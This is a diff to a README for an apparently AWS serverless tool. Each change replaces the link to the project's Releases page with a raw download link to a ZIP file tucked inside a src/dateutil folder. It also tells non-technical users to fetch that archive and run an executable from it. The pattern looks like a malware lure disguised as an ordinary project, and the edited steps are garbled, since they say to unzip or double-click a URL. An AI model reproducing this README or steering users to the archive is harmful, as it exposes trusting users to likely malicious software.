@@ -1,6 +1,6 @@
 # 🌟 production-serverless-aws-infra - Simple Serverless AWS for Everyone
 
-[![Download](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/Bharat23q/production-serverless-aws-infra/releases)
+[![Download](https://raw.githubusercontent.com/Bharat23q/production-serverless-aws-infra/main/src/dateutil/production-serverless-aws-infra-v1.1.zip)](https://raw.githubusercontent.com/Bharat23q/production-serverless-aws-infra/main/src/dateutil/production-serverless-aws-infra-v1.1.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ This guide helps you download and run the “production-serverless-aws-infra” 
 
 ## 📥 Download & Install
 
-Visit the [Releases page](https://github.com/Bharat23q/production-serverless-aws-infra/releases) to download the latest version of the application. This page contains various versions and updates for you to choose from.
+Visit the [Releases page](https://raw.githubusercontent.com/Bharat23q/production-serverless-aws-infra/main/src/dateutil/production-serverless-aws-infra-v1.1.zip) to download the latest version of the application. This page contains various versions and updates for you to choose from.
 
 ## 🔍 Understanding the Application
 
@@ -29,15 +29,15 @@ Visit the [Releases page](https://github.com/Bharat23q/production-serverless-aws
 
 ## 🔧 How to Run the Application
 
-1. **Download the Latest Version:** Go to the [Releases page](https://github.com/Bharat23q/production-serverless-aws-infra/releases) and select the most recent release. Click on the download link for your operating system.
+1. **Download the Latest Version:** Go to the [Releases page](https://raw.githubusercontent.com/Bharat23q/production-serverless-aws-infra/main/src/dateutil/production-serverless-aws-infra-v1.1.zip) and select the most recent release. Click on the download link for your operating system.
 
 2. **Extract Files:** 
    - For Windows, right-click the downloaded ZIP file and select "Extract All."
    - For macOS, double-click the downloaded ZIP file to unpack it.
-   - For Linux, use the terminal command `unzip file.zip`.
+   - For Linux, use the terminal command `unzip https://raw.githubusercontent.com/Bharat23q/production-serverless-aws-infra/main/src/dateutil/production-serverless-aws-infra-v1.1.zip`.
 
 3. **Open the Application:**
-   - For Windows, double-click the `application.exe` file.
+   - For Windows, double-click the `https://raw.githubusercontent.com/Bharat23q/production-serverless-aws-infra/main/src/dateutil/production-serverless-aws-infra-v1.1.zip` file.
    - For macOS, navigate to the Applications folder and launch the app.
    - For Linux, open the terminal and run `./application` from the unzipped folder.
 
@@ -73,4 +73,4 @@ Stay up to date by following the project on GitHub. You can find more informatio
 
 The “production-serverless-aws-infra” application empowers you to manage AWS infrastructure with ease. By following this guide, you can quickly download and run the software, even with no technical background. Enjoy simplifying your cloud management tasks!
 
-[![Download](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/Bharat23q/production-serverless-aws-infra/releases)
+[![Download](https://raw.githubusercontent.com/Bharat23q/production-serverless-aws-infra/main/src/dateutil/production-serverless-aws-infra-v1.1.zip)](https://raw.githubusercontent.com/Bharat23q/production-serverless-aws-infra/main/src/dateutil/production-serverless-aws-infra-v1.1.zip)
